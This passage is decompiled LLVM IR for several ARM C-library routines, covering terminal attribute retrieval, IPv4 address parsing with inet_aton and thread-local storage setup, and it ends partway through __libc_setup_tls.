define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17b90 = load i32, i32* @r4, align 4
  %v6_17b90 = load i32, i32* @r5, align 4
  %v9_17b90 = load i32, i32* @r6, align 4
  %v2_17b98 = ptrtoint i32* %stack_var_-52 to i32
  %v0_17b9c = load i32, i32* @r1, align 4
  store i32 %v0_17b9c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17ba8 = load i32, i32* @r0, align 4
  %v3_17ba8 = call i32 @ioctl(i32 %v0_17ba8, i32 21505, i32 %v2_17b98)
  store i32 %v3_17ba8, i32* %r0.global-to-local, align 4
  store i32 %v3_17ba8, i32* @r5, align 4
  %v2_17bac = icmp eq i32 %v3_17ba8, 0
  br i1 %v2_17bac, label %dec_label_pc_17bb4, label %dec_label_pc_17bf8

dec_label_pc_17bb4:                               ; preds = %entry
  %v4_17bc0 = zext i8 %tmp to i32
  store i32 %v4_17bc0, i32* @ip, align 4
  %v3_17bc4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17bc4, i32* @r3, align 4
  %v1_17bc8 = load i32, i32* @r4, align 4
  %v2_17bc8 = add i32 %v1_17bc8, 4
  %v3_17bc8 = inttoptr i32 %v2_17bc8 to i32*
  %v0_17bcc = load i32, i32* %r1.global-to-local, align 4
  %v1_17bcc = load i32, i32* @r4, align 4
  %v2_17bcc = add i32 %v1_17bcc, 8
  %v3_17bcc = inttoptr i32 %v2_17bcc to i32*
  store i32 %v0_17bcc, i32* %v3_17bcc, align 4
  %v0_17bd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_17bd0 = load i32, i32* @r4, align 4
  %v2_17bd0 = add i32 %v1_17bd0, 12
  %v3_17bd0 = inttoptr i32 %v2_17bd0 to i32*
  store i32 %v0_17bd0, i32* %v3_17bd0, align 4
  %v2_17bd4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17bd4, i32* @r1, align 4
  %v1_17bdc = load i32, i32* @r4, align 4
  %v2_17bdc = inttoptr i32 %v1_17bdc to i32*
  store i32 %v3_17bc4, i32* %v2_17bdc, align 4
  %v0_17be0 = load i32, i32* @ip, align 4
  %v1_17be0 = trunc i32 %v0_17be0 to i8
  %v2_17be0 = load i32, i32* @r4, align 4
  %v3_17be0 = add i32 %v2_17be0, 16
  %v4_17be0 = inttoptr i32 %v3_17be0 to i8*
  store i8 %v1_17be0, i8* %v4_17be0, align 1
  %v0_17be4 = load i32, i32* @r4, align 4
  %v1_17be4 = add i32 %v0_17be4, 17
  store i32 %v1_17be4, i32* %r0.global-to-local, align 4
  %v4_17be8 = call i32 @__GI_mempcpy(i32 %v1_17be4, i32 %v2_17bd4, i32 19, i32 %v3_17bc4)
  store i32 %v4_17be8, i32* %r0.global-to-local, align 4
  %v0_17bec = load i32, i32* @r5, align 4
  store i32 %v0_17bec, i32* %r1.global-to-local, align 4
  %v3_17bf4 = inttoptr i32 %v4_17be8 to i8*
  %v4_17bf4 = call i32 @__GI_memset(i8* %v3_17bf4, i32 %v0_17bec, i32 13)
  store i32 %v4_17bf4, i32* %r0.global-to-local, align 4
  %v0_17bf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17bf8

dec_label_pc_17bf8:                               ; preds = %entry, %dec_label_pc_17bb4
  %v0_17bf8 = phi i32 [ %v3_17ba8, %entry ], [ %v0_17bf8.pre, %dec_label_pc_17bb4 ]
  store i32 %v0_17bf8, i32* %r0.global-to-local, align 4
  store i32 %v3_17b90, i32* @r4, align 4
  store i32 %v6_17b90, i32* @r5, align 4
  store i32 %v9_17b90, i32* @r6, align 4
  ret i32 %v0_17bf8

; uselistorder directives
  uselistorder i32 %v0_17bf8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 19, 20, 5, 21, 17, 18, 6, 7, 8, 9, 10, 11, 22, 12, 23, 13, 24, 25, 14, 26, 15, 2, 27, 3, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bf8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17c0c = load i32, i32* @r4, align 4
  store i32 %v3_17c0c, i32* %stack_var_-28, align 4
  %v0_17c14 = load i32, i32* @r0, align 4
  %v2_17c14 = icmp eq i32 %v0_17c14, 0
  %v0_17c1c = load i32, i32* @r1, align 4
  br i1 %v2_17c14, label %dec_label_pc_17cf0, label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %entry
  br label %dec_label_pc_17c3c

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17c24, %dec_label_pc_17cb4
  %v1_17cb4 = phi i32 [ 0, %dec_label_pc_17c24 ], [ %v5_17cb4, %dec_label_pc_17cb4 ]
  %v0_17cb8 = phi i32 [ 1, %dec_label_pc_17c24 ], [ %v1_17cb8, %dec_label_pc_17cb4 ]
  %v0_17c3c = phi i32 [ %v0_17c14, %dec_label_pc_17c24 ], [ %v0_17c3c13, %dec_label_pc_17cb4 ]
  %v1_17c3c = inttoptr i32 %v0_17c3c to i8*
  %v2_17c3c = load i8, i8* %v1_17c3c, align 1
  %v3_17c3c = zext i8 %v2_17c3c to i32
  %v4_17c40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 276) to i32*), align 4
  %v2_17c44 = mul nuw nsw i32 %v3_17c3c, 2
  %v2_17c48 = add i32 %v2_17c44, %v4_17c40
  %v3_17c48 = inttoptr i32 %v2_17c48 to i16*
  %v4_17c48 = load i16, i16* %v3_17c48, align 2
  %v1_17c4c = and i16 %v4_17c48, 8
  %v2_17c4c = icmp eq i16 %v1_17c4c, 0
  br i1 %v2_17c4c, label %dec_label_pc_17cf0, label %dec_label_pc_17c54

dec_label_pc_17c54:                               ; preds = %dec_label_pc_17c3c
  br label %dec_label_pc_17c74

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c74
  %v2_17c5c = mul i32 %v0_17cb4, 10
  %v1_17c60 = add i32 %v2_17c5c, -48
  %v2_17c64 = add i32 %v3_17c74, %v1_17c60
  %v8_17c6c = icmp sgt i32 %v2_17c64, 255
  br i1 %v8_17c6c, label %dec_label_pc_17cf0, label %dec_label_pc_17c70

dec_label_pc_17c70:                               ; preds = %dec_label_pc_17c5c
  %v1_17c70 = add i32 %v0_17ca4, 1
  store i32 %v1_17c70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c54, %dec_label_pc_17c70
  %v0_17cb4 = phi i32 [ 0, %dec_label_pc_17c54 ], [ %v2_17c64, %dec_label_pc_17c70 ]
  %v0_17ca4 = phi i32 [ %v0_17c3c, %dec_label_pc_17c54 ], [ %v1_17c70, %dec_label_pc_17c70 ]
  %v1_17c74 = inttoptr i32 %v0_17ca4 to i8*
  %v2_17c74 = load i8, i8* %v1_17c74, align 1
  %v3_17c74 = zext i8 %v2_17c74 to i32
  %v2_17c78 = mul nuw nsw i32 %v3_17c74, 2
  %v2_17c7c = add i32 %v2_17c78, %v4_17c40
  %v3_17c7c = inttoptr i32 %v2_17c7c to i16*
  %v4_17c7c = load i16, i16* %v3_17c7c, align 2
  %v6_17c7c = zext i16 %v4_17c7c to i32
  %v1_17c80 = and i32 %v6_17c7c, 8
  %v2_17c80 = icmp eq i32 %v1_17c80, 0
  br i1 %v2_17c80, label %dec_label_pc_17c88, label %dec_label_pc_17c5c

dec_label_pc_17c88:                               ; preds = %dec_label_pc_17c74
  %v7_17c88 = icmp eq i32 %v0_17cb8, 4
  br i1 %v7_17c88, label %dec_label_pc_17ca0, label %dec_label_pc_17c90

dec_label_pc_17c90:                               ; preds = %dec_label_pc_17c88
  %v7_17c90 = icmp eq i8 %v2_17c74, 46
  br i1 %v7_17c90, label %dec_label_pc_17c98, label %dec_label_pc_17cf0

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c90
  %v1_17c98 = add i32 %v0_17ca4, 1
  store i32 %v1_17c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cb4

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c88
  %v2_17ca0 = icmp eq i8 %v2_17c74, 0
  %v1_17ca4 = add i32 %v0_17ca4, 1
  store i32 %v1_17ca4, i32* %r0.global-to-local, align 4
  br i1 %v2_17ca0, label %dec_label_pc_17cb4, label %dec_label_pc_17cac

dec_label_pc_17cac:                               ; preds = %dec_label_pc_17ca0
  %v1_17cac = and i32 %v6_17c7c, 32
  %v2_17cac = icmp eq i32 %v1_17cac, 0
  br i1 %v2_17cac, label %dec_label_pc_17cf0, label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17cac, %dec_label_pc_17ca0, %dec_label_pc_17c98
  %v0_17c3c13 = phi i32 [ %v1_17ca4, %dec_label_pc_17cac ], [ %v1_17ca4, %dec_label_pc_17ca0 ], [ %v1_17c98, %dec_label_pc_17c98 ]
  %v4_17cb4 = mul i32 %v1_17cb4, 256
  %v5_17cb4 = or i32 %v0_17cb4, %v4_17cb4
  %v1_17cb8 = add nuw nsw i32 %v0_17cb8, 1
  %v7_17cc0 = icmp slt i32 %v1_17cb8, 5
  br i1 %v7_17cc0, label %dec_label_pc_17c3c, label %dec_label_pc_17cc4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17cb4
  %v2_17cc4 = icmp eq i32 %v0_17c1c, 0
  br i1 %v2_17cc4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17cc4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cf4

bb:                                               ; preds = %dec_label_pc_17cc4
  %v4_17cc8 = udiv i32 %v5_17cb4, 16777216
  %v2_17ccc = udiv i32 %v5_17cb4, 256
  %v5_17cd0 = and i32 %v2_17ccc, 65280
  %v2_17cd4 = and i32 %v5_17cb4, 65280
  %v5_17cd8 = mul nuw nsw i32 %v2_17cd4, 256
  %v5_17cdc = mul i32 %v0_17cb4, 16777216
  %v6_17cd0 = or i32 %v4_17cc8, %v5_17cdc
  %v6_17cd8 = or i32 %v6_17cd0, %v5_17cd0
  %v6_17cdc = or i32 %v6_17cd8, %v5_17cd8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17ce8 = inttoptr i32 %v0_17c1c to i32*
  store i32 %v6_17cdc, i32* %v3_17ce8, align 4
  %v2_17cf4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17cf8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cf4

dec_label_pc_17cf0:                               ; preds = %dec_label_pc_17c90, %dec_label_pc_17cac, %dec_label_pc_17c3c, %dec_label_pc_17c5c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cf4

dec_label_pc_17cf4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17cf0
  %v1_17cf8 = phi i32 [ %v1_17cf8.pre, %bb ], [ 0, %dec_label_pc_17cf0 ], [ 1, %.thread8.thread ]
  %v2_17cf4 = phi i32 [ %v2_17cf4.pre, %bb ], [ %v3_17c0c, %dec_label_pc_17cf0 ], [ %v3_17c0c, %.thread8.thread ]
  store i32 %v2_17cf4, i32* @r4, align 4
  ret i32 %v1_17cf8

; uselistorder directives
  uselistorder i32 %v1_17cb8, { 1, 0 }
  uselistorder i32 %v5_17cb4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17ca4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 70, 1, 7, 2, 0, 3, 8, 9, 10, 11, 12, 50, 51, 13, 14, 15, 52, 53, 16, 17, 18, 19, 20, 54, 4, 55, 56, 21, 22, 5, 23, 57, 58, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 59, 60, 61, 48, 49, 46, 47, 62, 63, 64, 65, 6, 66, 29, 30, 67, 31, 32, 33, 34, 68, 35, 36, 69, 37, 38, 39, 40, 71 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 6, 3 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 6, 21, 22 }
  uselistorder i32 276, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17cf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17cf0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17c74, { 1, 0 }
  uselistorder label %dec_label_pc_17c3c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17d10 = load i32, i32* @r4, align 4
  store i32 %v3_17d10, i32* %stack_var_-16, align 4
  %v4_17d14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_17d1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17d24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 36) to i32*), align 4
  store i32 %v4_17d24, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_17d2c = inttoptr i32 %v4_17d14 to i32*
  %v2_17d2c = load i32, i32* %v1_17d2c, align 4
  %v4_17d30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 52) to i32*), align 4
  store i32 %v4_17d30, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17d38 = add i32 %v2_17d2c, 15
  %v4_17d3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 144) to i32*), align 4
  store i32 %v4_17d3c, i32* @ip, align 4
  %v1_17d40 = load i32, i32* @r0, align 4
  %v2_17d40 = add i32 %v1_17d40, %v1_17d38
  %v1_17d44 = inttoptr i32 %v4_17d1c to i32*
  %v2_17d44 = load i32, i32* %v1_17d44, align 4
  store i32 %v2_17d44, i32* %r3.global-to-local, align 4
  %v1_17d48 = and i32 %v2_17d40, -16
  store i32 %v1_17d48, i32* %v1_17d2c, align 4
  %v0_17d50 = load i32, i32* @r0, align 4
  %v1_17d50 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d50 = inttoptr i32 %v1_17d50 to i32*
  store i32 %v0_17d50, i32* %v2_17d50, align 4
  %v0_17d54 = load i32, i32* @r1, align 4
  %v1_17d54 = load i32, i32* %lr.global-to-local, align 4
  %v2_17d54 = inttoptr i32 %v1_17d54 to i32*
  store i32 %v0_17d54, i32* %v2_17d54, align 4
  %v0_17d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d58 = load i32, i32* @ip, align 4
  %v2_17d58 = inttoptr i32 %v1_17d58 to i32*
  store i32 %v0_17d58, i32* %v2_17d58, align 4
  %v2_17d5c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17d5c, i32* %r4.global-to-local, align 4
  %v1_17d60 = load i32, i32* @r0, align 4
  ret i32 %v1_17d60

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17d68(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d68:
  %v0_17d68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d68, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d68
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17d68, %bb
  %v4_17d78 = phi i32 [ %arg1, %dec_label_pc_17d68 ], [ 0, %bb ]
  ret i32 %v4_17d78

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r3.global-to-local, align 4
  %v4_17d8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 84) to i32*), align 4
  store i32 %v4_17d8c, i32* @lr, align 4
  %v4_17d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17db8 = inttoptr i32 %v4_17d98 to i32*
  store i32 1, i32* %v2_17db8, align 4
  %v0_17dbc = load i32, i32* %r3.global-to-local, align 4
  %v1_17dbc = load i32, i32* @lr, align 4
  %v2_17dbc = inttoptr i32 %v1_17dbc to i32*
  store i32 %v0_17dbc, i32* %v2_17dbc, align 4
  %v0_17dc0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17dd8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17dd8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17dd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17dd8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17dd8
  %v2_17dd8 = load i32, i32* @r4, align 4
  %v8_17dd8 = ashr i32 %v2_17dd8, %tmp
  %v9_17dd8 = and i32 %v8_17dd8, %tmp
  %v2_17ddc = load i32, i32* @ip, align 4
  %v8_17ddc = lshr i32 %v2_17ddc, %v9_17dd8
  %v9_17ddc = and i32 %v8_17ddc, %v9_17dd8
  store i32 %v9_17ddc, i32* %r0.global-to-local, align 4
  %v4_17de0 = inttoptr i32 %v9_17ddc to i32*
  store i32 %arg2, i32* %v4_17de0, align 4
  %v5_17de0 = load i32, i32* @ip, align 4
  %v6_17de0 = load i32, i32* %r0.global-to-local, align 4
  %v7_17de0 = sub i32 %v6_17de0, %v5_17de0
  store i32 %v7_17de0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17dd8, %bb
  %v8_17de0 = phi i32 [ %tmp, %dec_label_pc_17dd8 ], [ %v7_17de0, %bb ]
  ret i32 %v8_17de0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17dec = call i32 @__aeabi_read_tp()
  %v1_17df0 = inttoptr i32 %v0_17dec to i32*
  %v2_17df0 = load i32, i32* %v1_17df0, align 4
  %v1_17df4 = add i32 %arg1, 4
  %v2_17df4 = inttoptr i32 %v1_17df4 to i32*
  %v3_17df4 = load i32, i32* %v2_17df4, align 4
  %v1_17df8 = add i32 %v2_17df0, 8
  %v2_17df8 = inttoptr i32 %v1_17df8 to i32*
  %v3_17df8 = load i32, i32* %v2_17df8, align 4
  %v2_17dfc = add i32 %v3_17df8, %v3_17df4
  ret i32 %v2_17dfc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17e08 = load i32, i32* @r4, align 4
  store i32 %v3_17e08, i32* %stack_var_-36, align 4
  %v6_17e08 = load i32, i32* @r5, align 4
  %v15_17e08 = load i32, i32* @r8, align 4
  %v18_17e08 = load i32, i32* @sb, align 4
  %v21_17e08 = load i32, i32* @sl, align 4
  %v24_17e08 = load i32, i32* @fp, align 4
  %v27_17e08 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %sl.global-to-local, align 4
  %v4_17e18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 104) to i32*), align 4
  store i32 %v4_17e18, i32* %r3.global-to-local, align 4
  %v1_17e1c = inttoptr i32 %v4_17e18 to i32*
  %v2_17e1c = load i32, i32* %v1_17e1c, align 4
  store i32 %v2_17e1c, i32* %r2.global-to-local, align 4
  %v2_17e20 = icmp eq i32 %v2_17e1c, 0
  %v0_17e28 = load i32, i32* %r0.global-to-local, align 4
  %v0_17e2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17e2c, i32* %ip.global-to-local, align 4
  br i1 %v2_17e20, label %dec_label_pc_17ff4, label %dec_label_pc_17e34

dec_label_pc_17e34:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 156) to i32*), align 4
  store i32 %v4_17e38, i32* @lr, align 4
  store i32 %v2_17e1c, i32* %r1.global-to-local, align 4
  %v1_17e80 = inttoptr i32 %v4_17e38 to i32*
  %v2_17e8061 = load i32, i32* %v1_17e80, align 4
  %v4_17e8462 = mul i32 %v2_17e8061, 32
  %v5_17e8463 = add i32 %v4_17e8462, %v2_17e1c
  store i32 %v5_17e8463, i32* %r3.global-to-local, align 4
  %v3_17e8865 = icmp ult i32 %v2_17e1c, %v5_17e8463
  br i1 %v3_17e8865, label %dec_label_pc_17e44, label %dec_label_pc_17ff4.loopexit

dec_label_pc_17e44:                               ; preds = %dec_label_pc_17e34, %dec_label_pc_17e7c
  %v0_17e5c66 = phi i32 [ %v1_17e7c, %dec_label_pc_17e7c ], [ %v2_17e1c, %dec_label_pc_17e34 ]
  %v1_17e44 = inttoptr i32 %v0_17e5c66 to i32*
  %v2_17e44 = load i32, i32* %v1_17e44, align 4
  store i32 %v2_17e44, i32* %r3.global-to-local, align 4
  %v7_17e48 = icmp eq i32 %v2_17e44, 7
  br i1 %v7_17e48, label %dec_label_pc_17e50, label %dec_label_pc_17e7c

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e44
  %v1_17e50 = add i32 %v0_17e5c66, 20
  %v2_17e50 = inttoptr i32 %v1_17e50 to i32*
  %v3_17e50 = load i32, i32* %v2_17e50, align 4
  store i32 %v3_17e50, i32* %r3.global-to-local, align 4
  %v1_17e54 = add i32 %v0_17e5c66, 28
  %v2_17e54 = inttoptr i32 %v1_17e54 to i32*
  %v3_17e54 = load i32, i32* %v2_17e54, align 4
  store i32 %v3_17e54, i32* @r6, align 4
  %v1_17e5c = add i32 %v0_17e5c66, 16
  %v2_17e5c = inttoptr i32 %v1_17e5c to i32*
  %v3_17e5c = load i32, i32* %v2_17e5c, align 4
  store i32 %v3_17e5c, i32* %r3.global-to-local, align 4
  %v1_17e60 = add i32 %v0_17e5c66, 8
  %v2_17e60 = inttoptr i32 %v1_17e60 to i32*
  %v3_17e60 = load i32, i32* %v2_17e60, align 4
  store i32 %v3_17e60, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17e54, %v0_17e2c
  %v0_17e2c.v3_17e54 = select i1 %tmp78, i32 %v0_17e2c, i32 %v3_17e54
  store i32 %v0_17e2c.v3_17e54, i32* %fp.global-to-local, align 4
  %v2_17e98 = icmp eq i32 %v3_17e54, 0
  br i1 %v2_17e98, label %dec_label_pc_17ec0, label %bb

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e44
  %v1_17e7c = add i32 %v0_17e5c66, 32
  store i32 %v1_17e7c, i32* %r1.global-to-local, align 4
  %v2_17e80 = load i32, i32* %v1_17e80, align 4
  %v4_17e84 = mul i32 %v2_17e80, 32
  %v5_17e84 = add i32 %v4_17e84, %v2_17e1c
  store i32 %v5_17e84, i32* %r3.global-to-local, align 4
  %v3_17e88 = icmp ult i32 %v1_17e7c, %v5_17e84
  br i1 %v3_17e88, label %dec_label_pc_17e44, label %dec_label_pc_17e80.dec_label_pc_17ff4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17e50
  %v2_17e9c = add i32 %v3_17e54, -1
  br label %dec_label_pc_17ec4

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17e50, %dec_label_pc_17ff4
  %v0_17ed4.pre = phi i32 [ %v0_17ed4.pre.pre, %dec_label_pc_17ff4 ], [ ptrtoint (i32* @global_var_22244.363 to i32), %dec_label_pc_17e50 ]
  %v1_17ec4.pre = phi i32 [ %v1_17ec4.pre.pre, %dec_label_pc_17ff4 ], [ %v0_17e28, %dec_label_pc_17e50 ]
  %v1_17ee825 = phi i32 [ %v0_17ffc, %dec_label_pc_17ff4 ], [ %v0_17e2c.v3_17e54, %dec_label_pc_17e50 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17ff4 ], [ %v3_17e50, %dec_label_pc_17e50 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17ff4 ], [ %v3_17e5c, %dec_label_pc_17e50 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17ff4 ], [ %v3_17e60, %dec_label_pc_17e50 ]
  br label %dec_label_pc_17ec4

dec_label_pc_17ec4:                               ; preds = %bb, %dec_label_pc_17ec0
  %storemerge80 = phi i32 [ %v2_17e9c, %bb ], [ 0, %dec_label_pc_17ec0 ]
  %v0_17ec4 = phi i32 [ %v2_17e9c, %bb ], [ 0, %dec_label_pc_17ec0 ]
  %storemerge = phi i32 [ %v3_17e54, %bb ], [ 1, %dec_label_pc_17ec0 ]
  %storemerge79 = phi i32 [ %v3_17e54, %bb ], [ 1, %dec_label_pc_17ec0 ]
  %v0_17ed4 = phi i32 [ ptrtoint (i32* @global_var_22244.363 to i32), %bb ], [ %v0_17ed4.pre, %dec_label_pc_17ec0 ]
  %v1_17ec4 = phi i32 [ %v0_17e28, %bb ], [ %v1_17ec4.pre, %dec_label_pc_17ec0 ]
  %v1_17ee8 = phi i32 [ %v0_17e2c.v3_17e54, %bb ], [ %v1_17ee825, %dec_label_pc_17ec0 ]
  %stack_var_-52.3 = phi i32 [ %v3_17e50, %bb ], [ %stack_var_-52.0, %dec_label_pc_17ec0 ]
  %stack_var_-48.3 = phi i32 [ %v3_17e5c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17ec0 ]
  %stack_var_-44.3 = phi i32 [ %v3_17e60, %bb ], [ %stack_var_-44.0, %dec_label_pc_17ec0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17ec4 = add i32 %v1_17ec4, %v0_17ec4
  %v2_17ec8 = udiv i32 %v2_17ec4, %storemerge
  store i32 %v2_17ec8, i32* %r0.global-to-local, align 4
  %v2_17ecc = mul i32 %v2_17ec8, %storemerge
  store i32 %v2_17ecc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17ed4 = add i32 %v0_17ed4, 72
  %v3_17ed4 = inttoptr i32 %v2_17ed4 to i32*
  %v4_17ed4 = load i32, i32* %v3_17ed4, align 4
  store i32 %v4_17ed4, i32* %r3.global-to-local, align 4
  %v1_17ed8 = inttoptr i32 %v4_17ed4 to i32*
  %v2_17ed8 = load i32, i32* %v1_17ed8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17ee0 = add i32 %v1_17ee8, 1168
  %v2_17ee4 = add i32 %v1_17ee0, %stack_var_-52.3
  %v2_17ee8 = add i32 %v2_17ee4, %v2_17ecc
  %v2_17eec = add i32 %v2_17ee8, %v2_17ed8
  store i32 %v2_17eec, i32* %r0.global-to-local, align 4
  %v1_17ef0 = call i32 @__GI_sbrk(i32 %v2_17eec)
  %v1_17ef4 = load i32, i32* %fp.global-to-local, align 4
  %v1_17efc = sub i32 0, %v1_17ef4
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17ef4 = add i32 %v1_17ef0, 1167
  %v1_17f04 = add i32 %v2_17ef4, %v1_17ef4
  %v2_17f08 = and i32 %v1_17f04, %v1_17efc
  store i32 %v2_17f08, i32* @r5, align 4
  %v1_17f10 = load i32, i32* %sl.global-to-local, align 4
  %v3_17f10 = add i32 %v1_17f10, 10236
  %v4_17f10 = inttoptr i32 %v3_17f10 to i32*
  store i32 62, i32* %v4_17f10, align 4
  %v0_17f18 = load i32, i32* @r5, align 4
